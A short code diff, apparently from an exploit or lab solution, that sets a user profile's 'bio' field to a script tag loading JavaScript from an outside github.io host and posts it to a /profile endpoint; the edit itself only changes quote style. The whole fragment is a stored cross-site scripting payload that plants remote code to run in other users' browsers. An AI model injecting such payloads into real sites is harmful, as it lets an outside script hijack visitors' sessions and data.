@@ -58,7 +58,7 @@
       });
 
       const params2 = new URLSearchParams();
-      params2.append("bio","<script src=\"https://ianrichard3.github.io/thea/hola.js\"></script>")
+      params2.append("bio",'<script src="https://ianrichard3.github.io/thea/hola.js"></script>')
       fetch('/profile', {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
